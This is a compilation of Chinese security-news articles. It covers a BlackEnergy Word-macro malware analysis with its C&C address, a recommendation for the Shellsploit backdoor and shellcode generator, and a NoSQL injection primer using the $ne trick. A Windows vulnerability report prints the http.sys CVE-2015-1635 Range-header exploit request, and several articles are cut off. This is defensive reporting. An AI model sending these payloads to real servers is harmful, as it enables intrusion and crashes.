@@ -1,0 +1,1045 @@
+-----------------------------------------------------------0-----------------------------------------------------------
+0X0: 
+     [02.06]开发者福音：苹果悄然为CloudKit添加服务器端API 
+
+2月6日凌晨消息，苹果公司已经悄无声息地为CloudKit云端数据存储服务添加了一个服务器端API(应用程序接口)，此前该公司在开发者新闻博客上宣布了这个消息。这将使得开发者能为以CloudKit为支持的应用增加很多功能，使其可与iCloud CloudKit数据库进行互动。
+开发者福音：苹果悄然为CloudKit添加服务器端API
+这个网络服务API能让开发者在服务器上运行独立代码，并可对CloudKit服务中存储的记录进行添加、删除和修改操作。
+到目前为止，开发者与CloudKit之间的互动一直都仅限于苹果公司提供的应用API。虽然这也是很有用的，但对开发者来说则缺少高级使用的选择，原因是大多数现代应用都依靠服务器开执行任务。而在苹果公司推出上述API以后，开发者则可创造出更多种类的使用CloudKit的应用。业界人士预计，随着苹果公司推出这个API，CloudKit服务的采用率将随之上升。
+另一种类似的云基础设施服务Parse已在最近宣布，这项服务将于明年关闭。随着苹果公司推出这个API，CloudKit将可完全取代Parse成为一种云数据库引擎。
+
+
+
+
+-----------------------------------------------------------1-----------------------------------------------------------
+0X1: 
+     什么是三级分销系统？ 
+
+三级分销也就是我们常说的线上三个层级分渠道销售，线上分销是将传统线下的分销搬到网上去，通过企业商城总店发展出无数分销商的模式进行线上分销。那么什么是三级分销？三级分销是哪三级，怎么进行分销呢？现在举个例子说明一下。
+
+
+
+-----------------------------------------------------------2-----------------------------------------------------------
+0X2: 
+     [2.2]美国中情局抓捕斯诺登的计划曝光 
+
+=700) window.open('http://image.3001.net/images/20160202/14544066574564.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+近日Denfri.dk曝光了一组文件，而文件中证实了CIA计划抓捕并引渡爱德华・斯诺登的计划。
+
+
+计划被公布
+
+目前丹麦媒体Denfri.dk披露了许多文件，而这些文件中就包含了CIA抓捕并引渡爱德华斯诺登的计划文件。而这份文件是在2015年8月获取到的，美国中情局在哥本哈根有一支准军事队伍，当时就计划等到斯诺登出现就将其抓捕到美国飞机上。在2013年6月24日晚，斯诺登抵达莫斯科之后，打算飞往古巴。早前丹麦曾多次提醒美国，希望美国中央情报局尊重丹麦有关禁止此类飞行的法律，而美国也向丹麦保证没有侵犯丹麦领空。丹麦反对党激进自由党称，鉴于有这么多架次运送囚犯的飞机在丹麦降落，应该成立一个委员会对此事进行调查。
+根据当时欧盟的相关规定，商务用途私人飞机使用欧洲机场无须向相关国家政府提出申请，但如果超出商务用途的范围，尤其是为美国政府或中情局执行任务，就必须获得相关国家政府的批准。
+时任丹麦首相拉斯穆森则表示，他本人没有听说过此事，丹麦政府目前不打算对此进行调查。 The Register在2014年第一次详细公开报道哥本哈根存在中情局飞机，这是一架没有标志的湾流5型飞机，注册号码是N977GA。
+=700) window.open('http://image.3001.net/images/20160202/14544051124576.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+
+事件经过
+
+The Register报道称：
+
+2014年6月24日晚，斯诺登登抵达莫斯科之后，打算经香港飞往古巴，这架没有标志的湾流5型飞机，打算从华盛顿的一个商业机场起飞，马纳萨斯地区的机场很小心的为客户提供服务，包括“个人住宿和所需的设施”，而你根本找不到这座机场。第二天一大早，飞机飞过苏格兰上空，高度为4.5万英尺，这架飞机没有对外提交飞行计划，而且远超过正常的飞行高度。自9.11事件之后，CIA曾利用相同作用的飞机“引渡”恐怖主义疑犯，并送至CIA的秘密监狱。Denfri得到的文件显示，丹麦警察和政府官员认可了CIA飞机在哥本哈根存在的“状态和目的”。丹麦的情报部门也与CIA一起保密该信息，而这些文件中还有一封信，信中FBI代表寻求挪威政府支持，一起监控斯诺登的飞机动向。
+鉴于目前公布的文件显示，确实存在一个抓捕并引渡斯诺登的计划，如果成功抓捕到斯诺登，那么剩下的事情就可想而知了。
+*参考来源：SecurityAffairs、wsws
+
+
+
+
+
+
+
+
+-----------------------------------------------------------3-----------------------------------------------------------
+0X3: 
+     [2.3]工具推荐：Shellsploit，ShellCode生成器 
+
+
+
+0×00 简介
+
+
+Shellsploit让你生成定制shellcodes、后门、各种操作系统的攻击代码。同时可以使用它来进行代码混淆工作。
+=700) window.open('http://image.3001.net/images/20160129/14540291219021.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+=700) window.open('http://image.3001.net/images/20160129/14540291311540.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+
+0×01 安装或卸载
+
+如果你想使用Shellsploit，你首先得先安装Capstone
+Capstone’s安装如下：
+sudo pip install capstone同样得安装readline
+root$ sudo pip install readline安装好以上程序后，你就可以开始安装shellsploit了
+root$ python setup.py -s/--setup installroot$ chmod +x shellsploit (if you are using windows just pass this step)root$ ./shellsploit如果哪一天你觉得 shellsploit不好了，你可以进行卸载
+root$ python setup.py -s/--setup uninstall 
+
+0×02 参数说明
+
+usage: shellsploit[-l] [-p] [-o] [-n][--host] [--port]optional arguments:-l, --list Showlist of backdoors,shellcodes,injectors-p, --payloadSet payload for usage-n, -ncDeclare netcat for usage--host The connect/listen address--port The connect/listen port Inline arguments:Main Menu:helpHelp menuosCommand directly ur computeruse Select Module For Useclear Clear the menushow modulesShow Modules of Current Databaseshow backdoorsShow Backdoors of Current Databaseshow injectorsShow Injectors(Shellcode,dll,so etc..)Shellcode Menu:backExit Current Moduleset Set Value Of Options To ModulesipGet IP address(Requires net connection)osCommand directly ur computerclear Clear the menudisas Disassembly the shellcode(Support : x86/x64)whatisthisLearn which kind of shellcode it isiteration Encoder iteration timegenerateGenerate shellcodeoutputSave option to shellcode(txt,py,c,cpp,exe)show encoders List all obfucscation encodersshow optionsShow Current Options Of Selected ModuleInjector Menu:set Set Value Of Options To ModuleshelpHelp menubackExit Current ModuleosCommand directly ur computerpidsGet PID list of computergetpidGet specific PID on list(Ex. getpid Python)
+Shellsploit-framework项目地址：https://github.com/b3mb4m/shellsploit-framework
+
+
+
+
+
+
+
+
+-----------------------------------------------------------4-----------------------------------------------------------
+0X4: 
+     [2.3]乌克兰BlackEnergy新动向：通过Word文档进行APT攻击 
+
+
+
+0×01 前言
+
+
+去年晚些时候，一波网络攻击的其中几个部分经鉴定是针对乌克兰的。而对这些攻击比较广泛的说法是，此次攻击是著名的BlackEnergy木马并且增加了一些新的模块。
+BlackEnergy木马是著名的黑客Cr4sh创造的。在2007年，他声称不再开发这款木马，并且卖出木马的源码，估价在$700。刚开始，在2008年它被一些黑客们用来针对格鲁吉亚进行DDOS攻击。这些不知名的黑客在随后的几年里持续进行DDOS攻击。
+大概在2014年，一个特别的BlackEnergy组织开始引起大家的注意，他们开发了监测控制和数据采集类的插件来威胁ICS并且在全世界范围都非常活跃。这显示出BlackEnergy还存在的一些特别的能力，不仅仅局限于DDOS攻击。因此，我们称他们为BlackEnergy APT组织。
+这些组织的其中的一个APT攻击的目标就是乌克兰。自从2015年中期开始，乌克兰就开始存在通过Excel宏病毒进行BlackEnergy攻击，如果用户打开此类文档脚本就会释放木马至本地硬盘。
+几天前，我们发现了一种新型的针对乌克兰的BlackEnergy APT文档类攻击。不像以前采用Excel工作簿进行攻击，此次采用的是Word文档。该文档通过提及乌克兰“Right Sector”反对派政府来达到迷惑的效果。
+
+
+0×02 详细介绍
+
+去年年末，针对乌克兰的网络攻击层出不穷。包括来自ESET的我的同事，iSIGHT的小伙伴以及其他公司的广泛看法是，这些攻击是著名的BlackEnergy木马以及新型变种的攻击。其中乌克兰的一家Cys Centrum公司对袭击乌克兰的BlackEnergy攻击已经做了很好的分析（目前这篇文章仅存在俄文版，但是可以通过谷歌翻译进行阅读）。
+在过去，我们也曾写过BlackEnergy的分析，重点关注的是它的payloads，西门子的设备开发以及路由器的攻击插件。你可以在这里和这里阅读我的同事Kurt Baumgartner 和 Maria Garnaeva的相关文章。同样我们也贴出了BlackEnergy DDOS攻击的分析。
+自从2015年中期开始，在乌克兰就开始存在通过Excel宏病毒进行BlackEnergy攻击，如果用户打开此类文档脚本就会释放木马至本地硬盘。
+Office 文档宏病毒是一种早期的病毒，可以追溯到2000年，那时候Word和Excel支持自动执行宏指令。这就意味着病毒或者木马可以伴随着文档的打开而自动运行并且感染系统。随后微软禁用了这个特征，并且当前的Office版本需要用户一些特别的操作启用宏后才能打开存在文档中的宏指令。
+为了绕过这个防护，现在的黑客们都会使用社工的办法，让用户去启用宏从而能看到让其觉得很有意思的内容。几天前，我们捕获到一个BlackEnergy用于攻击乌克兰的新型文档。这个文档是Word文档，而不是以前的那种Excel文档：
+“$RR143TB.doc” (md5: e15b36c2e394d599a8ab352159089dd2)
+
+通过比较粗糙的检测发现，这份文档在2016年1月份从乌克兰上传一个复合扫描服务。它存在一个创建开始时间和最后保存的字段2015-07-27 10:21:00。这意味着该文档在更早前就被创建了，只是最近才被发现而已。
+打开这个文档前，用户被提示需要启用宏才能查看文档。
+=700) window.open('http://image.3001.net/images/20160201/14543316962561.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+有趣的是，这个文档通过“Pravii Sektor”(Right Sector，乌克兰民族党)来诱惑。这个党派在2013年11月成立并在该国的政治立场中扮演着很关键的角色。
+
+我们可以使用类似oledump攻击不运行Word提取其中的宏：
+=700) window.open('http://image.3001.net/images/20160201/14543317328259.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+如图所示，宏指令在内存中创建一个字符串，这个字符串文件随后被创建，并且写入“vba_macro.exe”。这个文件随后通过Shell命令被执行。
+
+这个 vba_macro.exe payload (md5: ac2d7f21c826ce0c449481f79138aebd)是一个典型的BlackEnergy释放的文件。最终释放的payload类似“%LOCALAPPDATA%\FONT CACHE.DAT”，这是一个DLL文件。通过使用rundll32执行之：
+rundll32.exe “%LOCALAPPDATA%\FONTCACHE.DAT”,#1
+
+为了确保在每个系统启动时执行，这个释放文件在系统启动文件夹下创建了一个LNK文件，这个文件的执行和每个系统的启动命令一样：
+%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\{D0B53124-E232-49FC-9EA9-75FA32C7C6C3}.lnk
+
+最后的payload (FONTCACHE.DAT, md5: 3fa9130c9ec44e36e52142f3688313ff)是一个在80端口上连接一个硬编码的C&ampC服务器，5.149.254.114.简单的木马。这个服务器也被来自ESET我的同事提及过，在上个月的一篇分析文档中。这个服务器当前处于未联通状态，或者通过IP地址的限制访问。一旦这个服务器在线，这个文档通过HTTP POST请求，发送基本的恶意指令：
+=700) window.open('http://image.3001.net/images/20160201/14543317575922.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+这个请求是BASE64加密的。其中一些字段包括：
+l b_gen=301018stb
+l b_ver=2.3
+l os_v=2600
+l os_type=0
+
+
+b_id是一个通过计算机的操作系统信息计算出来的一个独一无二的机器识别码，对于每个人来说也是唯一的。这将使得攻击者可以区别相同网络的不同受感染的主机。b_gen似乎是被攻击者的ID，类似301018stb。而STB应该是乌克兰电视台“STB”，http://www.stb.ua/ru/。 这家电视台曾在2015年11月公开提及BlackEnergy的受害者。
+
+
+0×03 总结
+
+BlackEnergy作为高级可持续性威胁是当前乌克兰近期遭受的主要威胁，此外还影响工业控制设备和间谍活动。
+我们的目标分析显示了下面几个最近一直被攻击的目标。如果你的机构或组织是下面其中之一的话，在采取防范措施的时候需要认识到这是BlackEnergy。
+l IS, Energy, government and media in Ukraine
+l ICS/SCADA companies worldwide
+l Energy companies worldwide
+
+
+早期的具有破坏性的payloads是2014年7月份。然而早期的版本存在各种bug。在近期的攻击当中，开发者开始解决未签名的驱动程序，之前依赖低级擦拭功能的磁盘，取而代之的是高级的擦拭功能并更加专注于文件扩展名而不是磁盘。这种攻击威胁不亚于磁盘的payload，当然，优势还在于不需要管理员权限，而且还可以在64位操作系统上运行。
+
+有趣的是，这个Word文档（不是Excel），ICS-CERT同样也提到了，在[backcolor=0px 0px]alert 14-281-01B.
+=700) window.open('http://image.3001.net/images/20160201/14543317859863.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+这个相当特殊，在各种不同类型的Office文档当中都存能包含宏，不仅仅是Excel文件。同样包含Word文件，就像ICS-CERT以及更早期的Cys Centrum提醒的那样，还有PPT文件。
+就使用Word进行APT攻击而言，我们近期发现Turla组织借助Word文档的宏释放恶意payloads（卡巴斯基提供的报告）。这让我们相信很多黑客都已经成功了并且会越来越普及。
+我们将会继续跟踪乌克兰的BlackEnergy，并会及时向我们的读者更新。
+更多关于BlackEnergy APT的攻击可以从卡巴斯基情报服务获取。
+
+
+0×04 相关文件
+
+Word document with macros (Trojan-Downloader.Script.Generic):
+e15b36c2e394d599a8ab352159089dd2
+Dropper from Word document (Backdoor.Win32.Fonten.y):
+ac2d7f21c826ce0c449481f79138aebd
+Final payload from Word document (Backdoor.Win32.Fonten.o):
+3fa9130c9ec44e36e52142f3688313ff
+BlackEnergy C&ampC Server:
+5.149.254.114
+* 参考来源：securelist
+
+
+
+
+
+
+-----------------------------------------------------------5-----------------------------------------------------------
+0X5: 
+     [2.2]一个有趣的实例让NoSQL注入不再神秘 
+
+
+
+一个有趣的实例让NoSQL注入不再神秘
+
+
+
+
+
+
+
+
+0×00 背景
+
+
+本文主要讲一下mongodb带来的安全问题，然后由一个有趣的CTF实例介绍对NoSQL的injection。
+MongoDB可以适应各种规模的企业，个人的开源数据库。定向是一种敏捷开发的数据库，MongoDB的数据模式可以随着应用程序的发展灵活更新。同时提供了二级索引以及完整的查询系统，构建新的应用，提高与客户之间的工作效率，加快产品上市时间，降低成本。但就安全领域本身而言，这个MongoDB并没有完全避免安全问题（当然，完全避免是不可能的）。
+
+
+0×01 基础知识
+
+在MongoDB的FAQ里面有这样一段话：
+
+“..with MongoDB we are not building queries from string , so traditional SQL injection attacks are not a problem.”因此大多数的开发者以为这样就高枕无忧了。其实他们的说法并无错误。
+传统的SQLi手段是不可行的。因为MongoDB所要求的输入形式是json的格式，例如：find({‘key1′’value1′})在实际的使用中(PHP环境下)，一般是这样使用$collection-&gtfind(array(‘key’=&gt ‘value’))对于习惯传统的SQL注入手段的我们来讲，这样的形式很难想到常规的方法去bypass也很难想到办法去构造payload，这种手段就像参数化的SQL语句一样很难注入。
+想要找到真的漏洞成因和原理，了解最基础的MongoDB语法是必要的，整体的介绍我就不罗嗦了，我只贴出我认为重要的来精简篇幅，节省大家的时间：
+条件操作符
+$gt : &gt$lt : &lt$gte: &gt=$lte: &lt=$ne : !=、&lt&gt$in : in$nin: not in$all: all$or:or$not: 反匹配(1.3.3及以上版本)模糊查询用正则式：db.customer.find({'name': {'$regex':'.*s.*'} })/*** : 范围查询 { &quotage&quot : { &quot$gte&quot : 2 , &quot$lte&quot : 21}}* : $ne { &quotage&quot : { &quot$ne&quot : 23}}* : $lt { &quotage&quot : { &quot$lt&quot : 23}}*/
+
+
+
+
+
+0×02 威胁
+
+但是问题不在SQL注入这里，我们显然不能用SQL语句的角度来考虑这个问题。我们显然应该换一个角度。
+在实际的使用中。find({‘var’:{‘$key’:'value’}}) 这样的语句是完全可以出现的。
+这样的语句我们在上0×01的介绍中有看到，涉及到范围查询与$ne与lt的使用时，举到了这些例子，这里在威胁部分，我们再举出几个例子：
+//查询age = 22的记录db.userInfo.find({&quotage&quot: 22})//相当于：select * from userInfo where age = 22//查询age &gt 22的记录db.userInfo.find({age: {$gt: 22}})//相当于：select * from userInfo where age &gt 22
+我们发现，在find的参数里，age对应的value设置为数组（这个数组包含特殊的mongoDB特别定义的变量名作为操作符，变量名对应的value作为操作对象）将会起到条件查询的作用。就PHP本身的性质而言，由于其松散的数组特性，导致如果我们输入value=A那么，也就是输入了一个value的值为1的数据。如果输入value[$ne]=2也就意味着value=array($ne=&gt2),在MongoDB的角度来，很有可能从原来的一个单个目标的查询变成了条件查询（$ne表示不等于-not equel）：
+从xxx.find({'key': 'A'})变成了xxx.find({'key':{$ne:'A'}})
+显然这样已经出现了非常严重的安全问题。
+
+
+0×03 探讨（从一个实例开始）
+
+就0×02中分析的威胁，我们可以来深入探讨一下这样的威胁会导致怎么样巨大的问题。
+（从这一部分开始，我就从一个root-me的实例来深度探讨一下这个NoSQL具体有怎么样的安全问题）
+这是Root-me.org的web-server的challenge
+[/url]
+
+
+
+-----------------------------------------------------------6-----------------------------------------------------------
+0X6: 
+     [2.2]匿名者（Anonymous）入侵美国州议会网站，影响2016大选 
+
+=700) window.open('http://image.3001.net/images/20160128/14539743558641.jpg%21small')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+2016年爱荷华州党团会议网站遭”匿名保守派”入侵，美国大选受到影响。
+“匿名者保守派”在周一的时候计划对2016年爱荷华州党团会议网站进行攻击。该组织在爱荷华周党团网站的首页上公布了其宣言及官方公告。公告内容如下：
+
+“萨拉佩林对川普的支持对我们组织来说一文不值，因为每个优秀的保守党人都应该知道萨拉佩林是国家的耻辱，她所代表的一切对美国来说都是错误的！”
+“爱荷华州党团会议网站被自称为’匿名保守派’的人攻击并侮辱”― Ian Schuler (@ianschuler) January 25, 2016
+
+
+
+-----------------------------------------------------------7-----------------------------------------------------------
+0X7: 
+     [2.2]OpenSSL高危漏洞：允许黑客解密HTTPS通信流量（CVE-2016-0701） 
+
+=700) window.open('http://image.3001.net/images/20160201/14542973726928.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+
+OpenSSL加密代码库的维护者们宣布修复了一个高危漏洞。该漏洞能让黑客获取在HTTPS和其他安全传输层，对加密通信进行解密的密钥。
+
+
+OpenSSL漏洞细节
+
+
+当各种条件满足时，该漏洞就可以被利用。首先，这个漏洞存在于OpenSSL v1.0.2。依赖它的应用，必须是使用数字签名算法生成基于DH密钥交换的临时key。默认情况下，该类服务器将复用相同的DH私钥，这会让它更易受到密钥覆盖攻击。基于DSA的DH（Diffie Hellman）配置（依赖于静态DH加密套件），也是会受影响的。
+幸运的是，许多主流应用的配置并不是OpenSSL+基于DSA的DH。比如Apache服务器，就开启了SSL_OP_SINGLE_DH_USE选项，这会使用不同的私钥。由OpenSSL衍伸出的BoringSSL 代码库，在几月前抛弃了对SSL_OP_SINGLE_DH_USE支持。而LibreSSL在本周早些时候也已经将这个选项弃用。然而，使用静态加密套件时，这些应用和库仍然是存在漏洞的。
+当其他附加条件满足后，黑客可以发送大量的握手请求包到存在漏洞的服务器或者PC机。进行了足够的计算后，黑客会获得部分密钥值，最后结合中国剩余定理，能够推导出完整的解密密钥。这个漏洞编号为CVE-2016-0701，Adobe系统研究员Antonio Sanso于周三发布了一篇博文，里面讲了相关的内容和报告给官方的细节。除此之外，OpenSSL官方警告，这次的解决方案可能会影响机器性能。
+OpenSSL修复该漏洞的速度让人惊讶，Sanso是1月12日向官方报告的该漏洞，这意味着官方修复、分发只用了2个多星期。有趣的是，当研究人员报告了漏洞后，解决DH密钥复用的修复进行了更新。但官方现在还没有发布新版本，他们通过补丁完成了部分修复。
+
+
+还记得Logjam么
+
+周四的发布中还包括了针对一个 HTTPS-crippling漏洞的解决方案，这个叫Logjam的漏洞于去年五月首次披露，影响成千上万的服务器。它允许黑客降级DH加密连接，使用更加脆弱的512位密钥。在这里，黑客可以使用预先计算好的数据，推断出通信双方的密钥。
+如果使用了DH参数，OpenSSL会拒绝少于1024位的密钥通信，此前一个OpenSSL补丁已经增加了768位的限制。
+注意，使用OpenSSL v1.0.2的应该升级到1.0.2f，而使用版本1.0.1的应该安装1.0.1r。周四的OpenSSL公告提醒用户，他们对1.0.1的支持将在今年年底结束，后续不会再有安全补丁。而对0.9.8和1.0.0的支持已于12月结束。
+*参考来源：AC，
+
+
+
+
+
+注意，使用OpenSSL v1.0.2的应该升级到1.0.2f(fu*k版本)，而使用版本1.0.1的应该安装1.0.1r(ri版本)。
+
+
+
+
+-----------------------------------------------------------8-----------------------------------------------------------
+0X8: 
+     [2.2]世界最大执法人员组织“美国警察同业会”计算机系统遭黑客攻击 
+
+=700) window.open('http://image.3001.net/images/20160201/14543091434193.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+日前，世界上最大的执法人员组织“美国警察同业会”计算机系统遭到黑客攻击，大量数据外泄。
+
+
+FOP简介
+
+美国警察同业会（ Fraternal Order of Police，简称FOP），是美国执法人员的兄弟会组织。它由超过325000名成员、2100个会社所组成，同时具有工会的性质和功能，然而它本身否认这一点，称自己为“公务人员的代表组织”、“国家执法者之声”。 该组织成立于1915年美国宾夕法尼亚州的匹兹堡，两名巡警Martin Toole和Aaron Burns集合21名当地警察于5月14日建立了FOP匹兹堡第一会社。
+FOP的组织方式和名称都与共济会有很大的相似性。它的组织结构与共济会一样都称为会社lodge，由地方会社、州会社和总会舍Grand Lodge所组成，其标志则更包含了明确的共济会符号特征。 一些美国人宣称美国警察要想得到晋升必须先成为共济会成员，这是否属实尚无法确证。但共济会组织中确实包含大量的警务人员。 
+FOP发言人Chuck Canterbury 在上周四表示：
+
+“我们的计算机专家已经发现黑客是通过什么方式获取到信息的，但目前还不能透露相关的信息，只能说明一件事，那就是其中的过程相当复杂。”
+
+事件还在调查中
+
+据悉目前美国警察同业会计算机系统遭到了一伙不明身份的黑客攻击，虽然还在调查中，但是已经确认这伙不明身份的黑客来自海外。而目前大约有2.5GB的数据在社交平台上被共享，并已经至少分享了150次，而这些文件都是一些“协议或合同”文件，其中都包括FOP与当地一些服务部门的合同，例如一些清洗车辆的开支费用、采购徽章的费用等等。这些文件中还有来源“Grand Lodge”的数据， Chuck Canterbury称，已经与FBI取得联系，但Canterbury相信没有个人隐私信息或财务数据泄露，而目前在调查中已经使用追踪IP地址的调查方式，并确认了一处英国IP地址。
+Canterbury在接受采访时，透露说：
+
+“他们登陆服务器时输入了错误的密码，服务器系统不接受。软件开始报错”。上面问题出现在田纳西州和俄亥俄州的服务器上面。该数据目前看来是由Thomas White掌握，但却是Cthulhu分享出来的， White在自己的网站表示道：
+
+“这些文件当时是通过一个机密的渠道提交给我的，并要求我站在公众利益的角度进行分享信息”。Cthulhu对来源保持缄默，而Canterbury指责这种“反警察言论”。据悉，目前FBI方面暂时没有回复。
+*参考来源：nbcnews、motherboard、theguardian
+
+
+
+
+
+-----------------------------------------------------------9-----------------------------------------------------------
+0X9: 
+     [2.2]2015 微软Windows漏洞报告 
+
+=700) window.open('http://image.3001.net/images/20160131/14542556657814.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+本文主要针对2015年微软、谷歌等公司相应产品新的安全防护机制或安全功能进行分析。
+实际上在前年，即2014年的报告《Windows exploitation in 2014》中，我们也提到了一个当前网络攻击的主要趋势―0day攻击，其中较为全面地分析了攻击者使用的相关入侵技术，像隐蔽强制下载攻击（或称偷渡式下载攻击，drive-by downloads）和本地权限提升（LPE）攻击。
+在这个新版本的报告中，将不会再重复先前所描述的。更多地是，我们将集中在2015年新的安全防护技术：如谷歌Chrome和微软Edge的新的安全功能， Hacking Team exp 相关信息以及微软的漏洞应急增强工具包EMET新的安全功能。
+
+
+统计信息
+
+从下表中，我们可以看到在过去的12个月里，IE 和Edge浏览器被修复加固的漏洞数量。其中标记为红色的漏洞，是已知在黑市中流通EXP的漏洞。
+=700) window.open('http://image.3001.net/images/20160201/14542564518982.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+目前，微软已经停止了对IE6/IE7/IE8/IE9/IE10的支持。而这会促使用户转向使用安全性会更高的IE11。当然，微软还是支持其他Windows系统中的早期IE版本（例如Windows Vista SP2的 IE9或者Windows Server 2012 的IE10）。
+=700) window.open('http://image.3001.net/images/20160201/14542565941939.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+在上图中，我们看到在2015年微软修复了许多关于各种Windows 用户模式组件 (Windows UMC)的漏洞。这些漏洞能为攻击者所利用，如通过远程代码执行漏洞执行恶意代码（RCE），利用本地权限提升来获取系统最高权限等等。第二种漏洞一般会结合远程代码执行漏洞来获取系统的所有访问权限。
+而对于Windows UMC，从下图可以看到，实际上在2015年修复的Windows UMC漏洞的数量约为2014年的4倍。其中橙色代表2015年的数据，蓝色代表2014年的数据。
+=700) window.open('http://image.3001.net/images/20160201/14542567602391.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+在上图中，我们了解了用户模式下的漏洞情况，那么在内核模式中情况又是怎样呢？内核模式(KM)驱动和win32k（Windows GUI 的内核组件）经常被攻击者利用其存在的漏洞来获取系统特权账户的权限。如果这些组件能进行远程代码执行，那么将是一件很为危险的事情。因为攻击者可以在内核模式下直接运行恶意代码，而接下来攻击者将可以获得计算机上所有资源以及部分主要用于系统的内存的控制权。下图是在内核及.net framework的漏洞情况。
+=700) window.open('http://image.3001.net/images/20160201/14542569825699.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+而从下表中，我们可以看到2015年中Windows 组件补丁最多的为IE 和 用户模式组件（UMC） 。
+=700) window.open('http://image.3001.net/images/20160201/1454257266205.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+为了分析Windows产品的薄弱点，我们再针对UMC进一步看看具体的漏洞情况，下表中我们可以了解到在针对各组件的RCE 以及LPE漏洞补丁中，Windows UMC中加固修复的漏洞补丁是最多的。
+=700) window.open('http://image.3001.net/images/20160201/1454257462425.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+
+漏洞
+
+在2014年中我们主要关注两种攻击类型，分别为隐蔽强制下载攻击（或称偷渡式下载攻击，drive-by downloads）以及本地权限提升（LPE）。而如本文开篇所言，第二种攻击类型能嵌入恶意代码，实现系统提权，同样也被用于远程代码执行漏洞利用，从而实现对浏览器沙盒的绕过，并运行payload或者直接在内核模式下运行恶意代码。
+下面的表显示了被ESET 检测到的，在黑市中流通着EXP的漏洞。
+=700) window.open('http://image.3001.net/images/20160201/14542577678036.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+其中，在2015年中令人印象深刻的LPE漏洞之一是CVE-2015-1769，关于挂载管理子系统的提权漏洞。该漏洞在微软发布的补丁MS15-085中被修复。其具体详情为在 Windows 挂载管理子系统发现一个提权漏洞，其中对其客户端和服务端均有影响。它允许攻击者利用可移动的 USB驱动的系统权限，通过根文件夹下特别定义的符号链接文件，来运行任意代码。对于这个漏洞，我们也称之为类蠕虫漏洞（Stuxnet-like），但实际上该漏洞比原始的蠕虫漏洞的危险性要小一点，原始蠕虫漏洞已经在补丁MS10-046中有修复。因为CVE-2015-1769并不存在于 Windows Shell 中，而仅仅只是在USB插入到计算机接口时才会被触发。换句话说，就是攻击者需要物理访问到PC机才能实施攻击。而MS15-085升级补丁修复了mountmgr.sys驱动以及两个内核文件 （ntdll.dll 以及ntoskrnl.exe）中存在的漏洞。
+另外一个漏洞为CVE-2015-1635。该漏洞存在于Windows 7及之后系统版本中的系统驱动文件http.sys，其允许攻击者以本地系统权限远程执行恶意代码，并可用于实施DoS攻击或者攻击目标机器，使之蓝屏死机。该漏洞是与Windows Server相关，在进行http 会话中，它能够被轻易利用，对HTTP 头部参数设置一个特定的值，从而触发整数溢出漏洞。该漏洞exp具体如下：
+
+
+GET /%7Bwelcome.png HTTP/1.1 User-Agent: Wget/1.13.4 (linux-gnu) Accept: */*
+Host: [server-ip]
+Connection: Keep-Alive
+Range: bytes=18-18446744073709551615
+
+Hacking Team
+
+
+去年发生的Hacking Team大量代码和工具泄露事件，对于去年及以后的安全形势的影响是重大的。其实Hacking Team的入侵攻击早在几年前（甚至更早）就已经开始进行了。从法律和道德的角度来看，关于Hacking Team出售网络攻击工具�其他国家的这一情况，实际上也违背了瓦森纳协议中的相关要求。因为泄露的文件显示，HT对外出售的国家中，包含了瓦森纳协议中所禁止的国家。
+FreeBuf 百科
+《瓦森纳协定》又称瓦森纳安排机制，全称为《关于常规武器和两用物品及技术出口控制的瓦森纳安排》 (The Wassenaar Arrangement on Export Controls for Conventional Arms and Dual-Use Good and Technologies)，目前共有包括美国、日本、英国、俄罗斯等40个成员国。“瓦森纳安排”规定成员国自行决定是否发放敏感产品和技术的出口许可证，并在自愿基础上向“安排”其他成员国通报有关信息。其根本目的在于通过成员国间的信息情报制度，提高常规武器和双用途物品及技术转让的透明度，以达到时常规武器和双用途物品及相关技术转让的监督和控制。
+其泄露的关于Windows, Flash Player 以及 Internet Explorer 的0day exp 也被传播开来。
+作为HT的客户，可以通过其提供的工具，对目标实施各种潜在的攻击。比如drive-by downloads等。对于drive-by downloads漏洞的EXP是从泄露的源码中发现的，其关于Flash Player 的exp可针对多种浏览器进行攻击，包括像IE 、Edge、Chrome、Firefox以及Opera等。而且，其中一些exp不仅仅能作用于Windows系统，其对Linux以及Apple OS X也是支持的。以下是目前监测到的Hacking Team泄露的工具中针对的相应漏洞统计。
+=700) window.open('http://image.3001.net/images/20160201/14542585534622.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+Hacking Team为他的用户提供支持所有主要的桌面和手机终端平台，包括像Windows, Linux, Android, OS X, and iOS等系统部署监控工具（后门）的能力。在下图中，我们对监测到的HT的后门程序进行了统计，具体情况如下，
